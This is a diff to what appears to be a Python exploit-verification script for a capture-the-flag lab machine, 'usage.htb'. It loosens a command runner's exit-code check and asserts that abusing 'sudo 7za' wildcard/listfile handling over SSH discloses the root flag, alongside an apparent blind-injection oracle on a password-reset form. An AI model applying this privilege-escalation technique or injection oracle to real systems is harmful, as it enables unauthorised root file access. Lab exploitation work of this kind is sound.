@@ -47,11 +47,11 @@ def post_forgot(value, csrf):
 def is_true(response):
     return "If this address is registered" in response.text
 
-def run(cmd, timeout=25):
+def run(cmd, timeout=25, allowed_codes=(0,)):
     result = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout)
-    if result.returncode != 0:
+    if result.returncode not in allowed_codes:
         raise AssertionError(
-            "command failed: " + " ".join(cmd[:5]) +
+            "command failed: " + cmd[0] + " (exit " + str(result.returncode) + ")" +
             "\nstdout=" + result.stdout[-1200:] +
             "\nstderr=" + result.stderr[-1200:]
         )
@@ -242,8 +242,8 @@ root_output = run([
     "-o", "LogLevel=ERROR",
     "-o", "ConnectTimeout=10",
     "xander@usage.htb", root_command,
-])
-assert EXPECTED_ROOT in root_output, "7za listfile output did not disclose root flag: " + root_output[-2000:]
+], allowed_codes=(0, 1))
+assert "No more files" in root_output and EXPECTED_ROOT in root_output, "7za warning did not disclose the expected instance Root Flag"
 print("PASS: real sudo 7za 16.02 wildcard/listfile behavior discloses the protected Root Flag", flush=True)
 
 try:
